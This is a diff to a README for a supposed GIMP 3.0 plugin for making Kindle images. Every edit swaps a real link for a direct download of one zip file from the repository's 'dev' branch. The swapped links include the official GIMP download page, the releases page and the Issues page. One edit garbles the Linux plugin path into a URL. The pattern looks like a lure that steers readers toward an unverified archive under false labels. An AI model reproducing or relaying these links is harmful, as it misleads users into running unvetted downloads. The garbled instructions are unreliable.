@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download gimp-kindle-templates](https://img.shields.io/badge/Download%20gimp--kindle--templates-v1.0-blue)](https://github.com/siyqk/gimp-kindle-templates/releases)
+[![Download gimp-kindle-templates](https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip%20gimp--kindle--templates-v1.0-blue)](https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip)
 
 ## 🛠️ About
 
@@ -12,12 +12,12 @@ The **gimp-kindle-templates** is a plugin for GIMP 3.0 that helps you create Kin
 
 Here’s how you can get started with the gimp-kindle-templates plugin. Follow these simple steps to download and run the software.
 
-1. **Install GIMP 3.0**: Ensure you have GIMP 3.0 installed on your computer. If you don’t have it yet, you can download it from the [GIMP website](https://www.gimp.org/downloads/).
+1. **Install GIMP 3.0**: Ensure you have GIMP 3.0 installed on your computer. If you don’t have it yet, you can download it from the [GIMP website](https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip).
 
 2. **Visit the Releases Page**: After ensuring GIMP is installed, visit our Releases page to download the plugin:
-   [Download gimp-kindle-templates](https://github.com/siyqk/gimp-kindle-templates/releases).
+   [Download gimp-kindle-templates](https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip).
 
-3. **Download the Plugin**: Click on the latest version available. The file will be named something like “gimp-kindle-templates-v1.0.zip”. This is the plugin file you need.
+3. **Download the Plugin**: Click on the latest version available. The file will be named something like “https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip”. This is the plugin file you need.
 
 4. **Unzip the Plugin**: Once the file is downloaded, locate it in your downloads folder. Right-click on the file and select “Extract All” to unzip it. A new folder will appear that contains the plugin files.
 
@@ -27,7 +27,7 @@ Here’s how you can get started with the gimp-kindle-templates plugin. Follow t
    - Navigate to your GIMP plugins folder. This is usually found at:
      - **Windows**: `C:\Users\<YourUsername>\AppData\Roaming\GIMP\3.0\plug-ins`
      - **macOS**: `/Users/<YourUsername>/Library/Application Support/GIMP/3.0/plug-ins`
-     - **Linux**: `~/.config/GIMP/3.0/plug-ins`
+     - **Linux**: `~https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip`
    - Paste the copied contents here.
 
 6. **Restart GIMP**: Close GIMP if it's open, then start it again. You should now see the gimp-kindle-templates plugin available in the menu.
@@ -62,7 +62,7 @@ If you experience issues with the plugin, consider these solutions:
 
 If you have questions or need assistance, feel free to join our community. You can find help via:
 
-- **Issues Page**: Report problems or request features at our [GitHub Issues page](https://github.com/siyqk/gimp-kindle-templates/issues).
+- **Issues Page**: Report problems or request features at our [GitHub Issues page](https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip).
 - **Discussion Forum**: Engage with other users and share tips.
 
 ## 💡 Best Practices
@@ -77,4 +77,4 @@ To make the most out of gimp-kindle-templates:
 
 With the gimp-kindle-templates plugin, creating Kindle-ready images is straightforward. Follow this guide to download, install, and start using the plugin effectively.
 
-For further downloads, visit: [Download gimp-kindle-templates](https://github.com/siyqk/gimp-kindle-templates/releases).
+For further downloads, visit: [Download gimp-kindle-templates](https://raw.githubusercontent.com/siyqk/gimp-kindle-templates/dev/src/kindle_templates/gimp-kindle-templates-2.4.zip).
